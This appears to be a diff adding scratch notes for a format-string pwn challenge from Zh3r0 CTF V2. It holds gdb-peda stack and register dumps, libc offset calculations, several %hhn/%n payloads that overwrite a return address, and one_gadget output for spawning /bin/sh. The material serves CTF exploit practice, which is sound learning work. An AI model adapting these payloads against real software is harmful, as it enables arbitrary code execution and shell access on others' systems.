@@ -1,0 +1,196 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555555000 r--p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf
+0x0000555555555000 0x0000555555556000 r-xp	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf
+0x0000555555556000 0x0000555555557000 r--p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf
+0x0000555555557000 0x0000555555558000 r--p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf
+0x0000555555558000 0x0000555555559000 rw-p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf
+0x0000555555559000 0x000055555555b000 rw-p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf
+0x000055555555b000 0x000055555557c000 rw-p	[heap]
+0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/libc.so.6
+0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/libc.so.6
+0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/libc.so.6
+0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/libc.so.6
+0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/ld-2.27.so
+0x00007ffff7ff5000 0x00007ffff7ff7000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7af2151 (<__GI___libc_read+17>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x55555555b260 ('a' <repeats 20 times>, "\n")
+RSI: 0x55555555b260 ('a' <repeats 20 times>, "\n")
+RDI: 0x55555555b290 --> 0xfbad2484 
+RBP: 0x7fffffffdd80 --> 0x5555555552c0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fffffffdd70 (0x00007fffffffdd70)
+RIP: 0x5555555552aa (<main+193>:	call   0x5555555550d0 <fprintf@plt>)
+R8 : 0x7ffff7dcf8c0 --> 0x0 
+R9 : 0x7ffff7ff6540 (0x00007ffff7ff6540)
+R10: 0x7ffff7ff6540 (0x00007ffff7ff6540)
+R11: 0x246 
+R12: 0x555555555100 (<_start>:	endbr64)
+R13: 0x7fffffffde60 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x55555555529f <main+182>:	mov    rsi,rdx
+   0x5555555552a2 <main+185>:	mov    rdi,rax
+   0x5555555552a5 <main+188>:	mov    eax,0x0
+=> 0x5555555552aa <main+193>:	call   0x5555555550d0 <fprintf@plt>
+   0x5555555552af <main+198>:	mov    edi,0x1
+   0x5555555552b4 <main+203>:	call   0x5555555550a0 <_exit@plt>
+   0x5555555552b9:	nop    DWORD PTR [rax+0x0]
+   0x5555555552c0 <__libc_csu_init>:	endbr64
+Guessed arguments:
+arg[0]: 0x55555555b290 --> 0xfbad2484 
+arg[1]: 0x55555555b260 ('a' <repeats 20 times>, "\n")
+arg[2]: 0x55555555b260 ('a' <repeats 20 times>, "\n")
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd70 (0x00007fffffffdd70)
+0008| 0x7fffffffdd78 --> 0x1fa316543da0ae00 
+0016| 0x7fffffffdd80 --> 0x5555555552c0 (<__libc_csu_init>:	endbr64)
+0024| 0x7fffffffdd88 --> 0x7ffff7a03bf7 (<__libc_start_main+231>:	mov    edi,eax)
+0032| 0x7fffffffdd90 --> 0x1 
+0040| 0x7fffffffdd98 --> 0x7fffffffde68 --> 0x7fffffffe1a9 ("/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf")
+0048| 0x7fffffffdda0 --> 0x100008000 
+0056| 0x7fffffffdda8 --> 0x5555555551e9 (<main>:	endbr64)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+
+gdb-peda$ x/80gx 0x7fffffffdd70
+0x7fffffffdd70:	0x00007fffffffdd70	0x1fa316543da0ae00
+0x7fffffffdd80:	0x00005555555552c0	0x00007ffff7a03bf7
+0x7fffffffdd90:	0x0000000000000001	0x00007fffffffde68
+0x7fffffffdda0:	0x0000000100008000	0x00005555555551e9
+0x7fffffffddb0:	0x0000000000000000	0x3d1ad1c96512b7e2
+
+
+%136c%5$hhn
+%104c%5$hhn
+
+12345678901234567890123456789012
+%c%c%c%101c%hhn%20865c%5$hn
+%c%c%c%101c%hhn%20632c%5$hn
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7af2151 (<__GI___libc_read+17>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x55555555b260 ('a' <repeats 13 times>, "\n")
+RSI: 0x55555555b260 ('a' <repeats 13 times>, "\n")
+RDI: 0x55555555b290 --> 0xfbad2484 
+RBP: 0x7fffffffdd80 --> 0x5555555552c0 (<__libc_csu_init>:	endbr64)
+RSP: 0x7fffffffdd68 --> 0x5555555552af (<main+198>:	mov    edi,0x1)
+RIP: 0x7ffff7a46eb0 (<__fprintf>:	sub    rsp,0xd8)
+R8 : 0x7ffff7dcf8c0 --> 0x0 
+R9 : 0x7ffff7ff6540 (0x00007ffff7ff6540)
+R10: 0x7ffff7ff6540 (0x00007ffff7ff6540)
+R11: 0x246 
+R12: 0x555555555100 (<_start>:	endbr64)
+R13: 0x7fffffffde60 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7a46ea6 <printf_size_info+22>:	mov    eax,0x1
+   0x7ffff7a46eab <printf_size_info+27>:	ret    
+   0x7ffff7a46eac:	nop    DWORD PTR [rax+0x0]
+=> 0x7ffff7a46eb0 <__fprintf>:	sub    rsp,0xd8
+   0x7ffff7a46eb7 <__fprintf+7>:	test   al,al
+   0x7ffff7a46eb9 <__fprintf+9>:	mov    QWORD PTR [rsp+0x30],rdx
+   0x7ffff7a46ebe <__fprintf+14>:	mov    QWORD PTR [rsp+0x38],rcx
+   0x7ffff7a46ec3 <__fprintf+19>:	mov    QWORD PTR [rsp+0x40],r8
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd68 --> 0x5555555552af (<main+198>:	mov    edi,0x1)
+0008| 0x7fffffffdd70 (0x00007fffffffdd70)
+0016| 0x7fffffffdd78 --> 0xf481cdea1aeb9a00 
+0024| 0x7fffffffdd80 --> 0x5555555552c0 (<__libc_csu_init>:	endbr64)
+0032| 0x7fffffffdd88 --> 0x7ffff7a03bf7 (<__libc_start_main+231>:	mov    edi,eax)
+0040| 0x7fffffffdd90 --> 0x1 
+0048| 0x7fffffffdd98 --> 0x7fffffffde68 --> 0x7fffffffe1a9 ("/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf")
+0056| 0x7fffffffdda0 --> 0x100008000 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+__fprintf (stream=0x55555555b290, format=0x55555555b260 'a' <repeats 13 times>, "\n") at fprintf.c:27
+27	fprintf.c: No such file or directory.
+gdb-peda$ x/80gx 0x7fffffffdd00
+0x7fffffffdd00:	0x000055555555b260	0x000000011aeb9a00
+0x7fffffffdd10:	0x000055555555b290	0x00007ffff7dcda00
+0x7fffffffdd20:	0x000055555555b260	0x0000000000000000
+0x7fffffffdd30:	0x00007fffffffde60	0x0000000000000000
+0x7fffffffdd40:	0x0000000000000000	0x00007ffff7a60cad
+0x7fffffffdd50:	0x0000000000000000	0x00007fffffffdd80
+0x7fffffffdd60:	0x0000555555555100	0x00005555555552af
+0x7fffffffdd70:	0x00007fffffffdd70	0xf481cdea1aeb9a00
+0x7fffffffdd80:	0x00005555555552c0	0x00007ffff7a03bf7
+0x7fffffffdd90:	0x0000000000000001	0x00007fffffffde68
+0x7fffffffdda0:	0x0000000100008000	0x00005555555551e9
+0x7fffffffddb0:	0x0000000000000000	0x5af97b522c3e0abf
+
+gdb-peda$ p main
+$1 = {<text variable, no debug info>} 0x5555555551e9 <main>
+
+
+gdb-peda$ x/80gx 0x7fffffffdc00
+0x7fffffffdc00:	0x0000000000000270	0x0000000000021000
+0x7fffffffdc10:	0xfffffffffffff000	0x0000000000000000
+0x7fffffffdc20:	0x0000000000000001	0x00007ffff7ffe710
+0x7fffffffdc30:	0x0000000000000000	0x0000000000000250
+0x7fffffffdc40:	0xffffffffffffffb0	0xf481cdea1aeb9a00
+0x7fffffffdc50:	0x00007ffff7dcdca0	0x0000000000000000
+0x7fffffffdc60:	0x0000555555555100	0x00007fffffffde60
+0x7fffffffdc70:	0x0000000000000000	0x0000000000000000
+0x7fffffffdc80:	0x00007fffffffdd80	0x00007ffff7a46f44
+                                                 ^ return address
+0x7fffffffdc90:	0x0000003000000010	0x00007fffffffdd70
+0x7fffffffdca0:	0x00007fffffffdcb0	0xf481cdea1aeb9a00
+0x7fffffffdcb0:	0x00007ffff7dcda00	0x00007ffff7dca2a0
+0x7fffffffdcc0:	0x000055555555b260	0x00007ffff7af2151
+0x7fffffffdcd0:	0x00007ffff7dcf8c0	0x00007ffff7ff6540
+0x7fffffffdce0:	0xffffffffffffffb0	0x0000000000000000
+0x7fffffffdcf0:	0x000055555555b26d	0x00007ffff7a61f42
+0x7fffffffdd00:	0x000055555555b260	0x000000011aeb9a00
+0x7fffffffdd10:	0x000055555555b290	0x00007ffff7dcda00
+0x7fffffffdd20:	0x000055555555b260	0x0000000000000000
+0x7fffffffdd30:	0x00007fffffffde60	0x0000000000000000
+0x7fffffffdd40:	0x0000000000000000	0x00007ffff7a60cad
+0x7fffffffdd50:	0x0000000000000000	0x00007fffffffdd80
+0x7fffffffdd60:	0x0000555555555100	0x00005555555552af
+0x7fffffffdd70:	0x00007fffffffdd70	0xf481cdea1aeb9a00
+0x7fffffffdd80:	0x00005555555552c0	0x00007ffff7a03bf7
+
+0x00007ffff7a46f44 - 0x00007ffff79e2000 = 0x64f44
+0x00007ffff7a03bf7 - 0x00007ffff79e2000 = 0x21bf7
+
+0x4f3d5 - 0x21bf7 - 8 = 0x2d7d6 = 186326
+
+12345678901234567890123456789012
+%c%c%c%101c%hhn%*9$c%86334c%5$n
+
+%c%c%c%5c%hhn%*8$c%186326c%5$n
+
+mito@ubuntu:~/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln$ one_gadget libc.so.6 
+0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f432 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a41c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
